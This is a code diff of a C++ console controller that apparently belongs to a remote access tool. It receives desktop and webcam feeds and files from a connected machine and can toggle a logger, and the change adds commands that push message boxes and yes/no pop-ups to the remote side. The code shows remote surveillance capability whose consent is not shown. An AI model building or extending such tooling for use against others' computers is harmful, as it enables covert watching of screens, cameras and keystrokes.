@@ -11,6 +11,18 @@
 
 using namespace std;
 
+std::wstring s2ws(const std::string& s)
+{
+    int len;
+    int slength = (int)s.length() + 1;
+    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
+    wchar_t* buf = new wchar_t[len];
+    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
+    std::wstring r(buf);
+    delete[] buf;
+    return r;
+}
+
 NetworkHandlerClient NH;
 string DesktopFeed = "Desktop Feed";
 string CamFeed = "Cam Feed";
@@ -38,7 +50,7 @@ void CallBackFunc(int event, int x, int y, int flags, void* userdata)
     }
 }
 
-void rcv(NetworkHandlerClient NH) {
+void rcv() {
     DataType dt;
     cv::Mat image;
     INPUT in;
@@ -57,14 +69,14 @@ void rcv(NetworkHandlerClient NH) {
     NH.AddDataType("DisableLogger", 13);
     NH.AddDataType("RecvPopUp", 14);
     NH.AddDataType("RecvPopUpYN", 15);
+    NH.AddDataType("ConsoleMessage", 16);
     //NH.AddDataType("", 3);
 
-    NH.SendTypeList();
-
     while (true) {
-        NH.RecvDataType(dt);
+        NH.RecvDataType(&dt);
         if (dt.Name == "SendFILE") {
-            std::string path = NH.RecvDataT<std::string>();
+            std::string path;
+            NH.RecvDataT<std::string>(&path);
             NH.RecvFile(path);
         }
         else if (dt.Name == "DesktopIMG")
@@ -96,11 +108,8 @@ void rcv(NetworkHandlerClient NH) {
                 cv::destroyWindow(CamFeed);
             }
         }
-        else if (dt.Name == "Invalid") {
-            printf("invalid packet type");
-        }
         else {
-            printf("invalid packet type");
+            //printf("invalid packet type");
         }
 
     }
@@ -115,7 +124,7 @@ int main()
     string port= "None";
     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 
-    recvThread = thread();
+    recvThread = thread(rcv);
 
     while (true)
     {
@@ -150,6 +159,11 @@ int main()
                     printf("failed to connect!\n");
                     NH.DisConnect();
                 }
+                else
+                {
+                    NH.SendDataType(1);
+                    NH.SendTypeList();
+                }
             }
             else {
                 ip = "None";
@@ -165,6 +179,8 @@ int main()
             if (NH.DefaultInitConnect()) {
                 ip = NH.getIP();
                 port = NH.getPort();
+                NH.SendDataType(1);
+                NH.SendTypeList();
             }
             else {
                 ip = "None";
@@ -182,7 +198,13 @@ int main()
         }
         else if (input == "Help") {
             SetConsoleTextAttribute(hConsole, 11);
-            printf("Commands are: ");
+            printf("Commands are: \n");
+            printf("Connect \n");
+            printf("DefaultConnect \n");
+            printf("Disconnect \n");
+            printf("Message \n");
+            printf("MessageBox \n");
+            printf("MessageBoxYN \n");
             continue;
         }
         else if (input == "Message") {
@@ -190,10 +212,52 @@ int main()
             printf("Enter message: ");
             SetConsoleTextAttribute(hConsole, 7);
             getline(cin, input);
+            NH.SendDataType("ConsoleMessage");
             NH.SendDataT<string>(input);
+        }
+        else if (input == "MessageBox") {
+            NH.SendDataType("RecvPopUp");
+
+            string title;
+            string msg;
+            printf("Box Title: ");
+            getline(cin, title);
+            printf("Box Message: ");
+            getline(cin, msg);
+
+            NH.SendDataT<wstring>(s2ws(title+'\0'));
+            NH.SendDataT<wstring>(s2ws(msg + '\0'));
+            continue;
+        }
+        else if (input == "MessageBoxYN") {
+            NH.SendDataType("RecvPopUpYN");
+
+            string title;
+            string msg;
+            printf("Box Title: ");
+            getline(cin, title);
+            printf("Box Message: ");
+            getline(cin, msg);
+
+            NH.SendDataT<wstring>(s2ws(title));
+            NH.SendDataT<wstring>(s2ws(msg));
+
+            int awnser;
+
+            NH.RecvDataT<int>(&awnser);
+
+            if (awnser == 1) {
+                printf("Answer is yes\n");
+            }
+            else {
+                printf("Answer is no\n");
+            }
         }
         else if (input == "") {
             
+        }
+        else if (input == "") {
+
         }
         else {
             cout << "Invalid Command!" << endl;
